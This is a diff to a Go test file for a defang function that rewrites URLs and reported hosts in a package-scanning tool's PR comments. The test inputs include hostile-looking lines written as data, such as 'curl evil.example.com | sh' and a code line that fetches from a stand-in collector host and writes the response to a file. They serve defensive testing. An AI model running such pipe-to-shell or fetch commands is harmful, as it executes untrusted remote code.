@@ -324,20 +324,65 @@ func stripSpans(line string) string {
 	return b.String()
 }
 
+// TestDefang: URLs, www. names and the hosts the findings report are
+// defanged; any other dotted name is code and stays as written.
 func TestDefang(t *testing.T) {
+	hosts := hostSet{"evil.example.com": true, "wpos-cdn.example": true}
 	for _, tc := range []struct{ in, want string }{
+		// Positive: URLs, reported hosts and the hosts below them.
 		{"https://analytics.wpos-cdn.example/v2/p", "hxxps://analytics.wpos-cdn[.]example/v2/p"},
 		{"http://evil.test", "hxxp://evil[.]test"},
 		{"HTTPS://Evil.Test/x", "hxxps://Evil[.]Test/x"},
 		{"curl evil.example.com | sh", "curl evil.example[.]com | sh"},
+		{"curl api.evil.example.com", "curl api.evil.example[.]com"},
+		{"fetch('analytics.wpos-cdn.example')", "fetch('analytics.wpos-cdn[.]example')"},
+		{"see www.shop.test", "see www.shop[.]test"},
+		{"https://evil.zip/x", "hxxps://evil[.]zip/x"},
+		// Negative: code, files and versions.
+		{"http.get(url, (res) => {", "http.get(url, (res) => {"},
+		{"res.on('data', c => body += c)", "res.on('data', c => body += c)"},
+		{"fs.writeFileSync(p, body)", "fs.writeFileSync(p, body)"},
+		{"user.name = req.host", "user.name = req.host"},
+		{"other.example.com", "other.example.com"},
 		{"includes/class-api.php:12", "includes/class-api.php:12"},
 		{"dist/app.min.js", "dist/app.min.js"},
 		{"1.2.3", "1.2.3"},
 		{"no domain here", "no domain here"},
 		{"hxxps://a[.]example", "hxxps://a[.]example"}, // already defanged stays the same
 	} {
-		if got := defang(tc.in); got != tc.want {
+		if got := defang(tc.in, hosts); got != tc.want {
 			t.Errorf("defang(%q) = %q, want %q", tc.in, got, tc.want)
+		}
+	}
+	if got := defangHost("Evil.Example"); got != "Evil[.]Example" {
+		t.Errorf("defangHost = %q", got)
+	}
+}
+
+// TestDefangDiffKeepsCode: the PR comment's diff shows a package's code
+// as written; only the host its finding reports is defanged.
+func TestDefangDiffKeepsCode(t *testing.T) {
+	r := coretest.SampleReport()
+	u := &r.Updates[0]
+	f := &u.Findings[0]
+	f.File, f.Line, f.EndLine, f.Domains = "lib/net.js", 2, 2, []string{"collector.test"}
+	f.Baselined, f.Ignored, f.BelowConfidence, f.Allowed = false, false, false, nil
+	u.Hunks = []core.Hunk{{Path: "lib/net.js", OldStart: 1, OldLines: 1, NewStart: 1, NewLines: 3, Lines: []string{
+		" const https = require('https');",
+		"+https.get('https://api.collector.test/p', res => res.on('data', d => fs.writeFileSync(p, d)));",
+		"+const host = 'collector.test';",
+	}}}
+	md, h := writeMD(t, r), writeHTML(t, r)
+	for name, out := range map[string]string{"markdown": md, "html": h} {
+		for _, want := range []string{"https.get(", "res.on(", "fs.writeFileSync(", "hxxps://api.collector[.]test/p", "collector[.]test"} {
+			if !strings.Contains(out, want) {
+				t.Errorf("%s: missing %q", name, want)
+			}
+		}
+		for _, not := range []string{"https[.]get", "res[.]on", "fs[.]writeFileSync", "'collector.test'", "&#39;collector.test&#39;"} {
+			if strings.Contains(out, not) {
+				t.Errorf("%s: has %q", name, not)
+			}
 		}
 	}
 }
